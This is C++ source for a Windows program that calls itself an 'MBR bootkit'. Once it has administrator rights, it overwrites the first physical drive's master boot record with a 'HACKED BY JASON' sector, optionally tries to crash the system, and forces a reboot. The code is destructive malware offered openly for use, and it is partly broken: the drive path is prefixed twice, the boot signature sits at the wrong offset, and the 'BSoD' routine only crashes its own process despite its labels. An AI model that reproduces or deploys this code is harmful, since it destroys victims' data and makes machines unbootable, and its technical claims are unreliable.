#include <windows.h>
#include <winioctl.h>
#include <iostream>
#include <cstdlib>

#define MBR_SIZE 512

// Enhanced MBR with "HACKED BY JASON" (same boot sector)
unsigned char hacked_mbr[MBR_SIZE] = {
    0xEB, 0x3C, 0x90, 0x48, 0x41, 0x43, 0x4B, 0x45, 0x44, 0x20, 0x42, 0x59, 0x20, 0x4A, 0x41, 0x53,
    0x4F, 0x4E, 0x21, 0x21, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xB8, 0x00, 0x13, 0xCD, 0x10, 0xB4, 0x0E, 0xB3, 0x10, 0xB0, 0x07, 0x8A, 0x16, 0x7C, 0x04, 0x8B,
    0x1E, 0x7E, 0x04, 0xCD, 0x10, 0x80, 0xEE, 0x01, 0x75, 0xF3, 0xEB, 0xFE, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55,
    0xAA
};

// BSoD Trigger Functions
void TriggerBSOD() {
    std::cout << "[+] Triggering Blue Screen of Death..." << std::endl;
    
    // Method 1: Stack Overflow (most reliable)
    volatile int* ptr = (volatile int*)0xDEADBEEF;
    *ptr = 0x1337BEEF;
    
    // Method 2: Invalid Memory Access
    // *(int*)0 = 0;
    
    // Method 3: NtRaiseHardError (requires ntdll)
    // typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, PULONG UnicodeStringParameterMask, PVOID* Parameters, ULONG ValidResponseOptions, PULONG Response);
    // HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    // pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
    // ULONG response;
    // NtRaiseHardError(0xC0000022, 0, 0, 0, 6, &response);
}

bool IsElevated() {
    BOOL isElevated = FALSE;
    HANDLE token = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isElevated = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }
    return isElevated;
}

HANDLE GetPhysicalDriveHandle(const char* drive) {
    char drivePath[32];
    sprintf_s(drivePath, sizeof(drivePath), "\\\\.\\%s", drive);
    
    HANDLE hDevice = CreateFileA(
        drivePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    return hDevice;
}

void AutoRestart(int delaySeconds = 5) {
    std::cout << "[+] Auto-restarting system in " << delaySeconds << " seconds..." << std::endl;
    Sleep(delaySeconds * 1000);
    
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return;
    }
    
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    
    // Force restart (EWX_FORCE | EWX_REENBOOT)
    ExitWindowsEx(EWX_FORCE | EWX_REBOOT, SHTDN_REASON_MAJOR_APPLICATION);
}

int main(int argc, char* argv[]) {
    std::cout << "=== HACKED BY JASON - MBR BOOTKIT + BSoD + AUTO-RESTART ===" << std::endl;
    
    if (!IsElevated()) {
        std::cerr << "[-] ERROR: Administrator privileges REQUIRED!" << std::endl;
        return 1;
    }
    
    std::cout << "[+] Administrator privileges confirmed" << std::endl;
    
    // Parse command line args
    bool bsod = false, restart = true;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--bsod") == 0) bsod = true;
        if (strcmp(argv[i], "--no-restart") == 0) restart = false;
    }
    
    // Infect MBR
    HANDLE hDrive = GetPhysicalDriveHandle("\\\\.\\PhysicalDrive0");
    if (!hDrive || hDrive == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] CRITICAL: Cannot access physical drive!" << std::endl;
        std::cerr << "[-] Check: BitLocker OFF, Disk not in use" << std::endl;
        return 1;
    }
    
    DWORD bytesWritten;
    BOOL writeResult = WriteFile(hDrive, hacked_mbr, MBR_SIZE, &bytesWritten, NULL);
    CloseHandle(hDrive);
    
    if (writeResult && bytesWritten == MBR_SIZE) {
        std::cout << "[+] SUCCESS: MBR INFECTED! 'HACKED BY JASON' on next boot" << std::endl;
    } else {
        std::cerr << "[-] MBR WRITE FAILED (Error: " << GetLastError() << ")" << std::endl;
    }
    
    // BSoD Trigger (if requested)
    if (bsod) {
        std::cout << "[!] BSoD TRIGGER ACTIVATED!" << std::endl;
        TriggerBSOD();
    }
    
    // Auto-restart (unless disabled)
    if (restart) {
        AutoRestart(3);
    } else {
        std::cout << "[+] Manual restart required to test MBR payload" << std::endl;
        system("pause");
    }
    
    return 0;
}
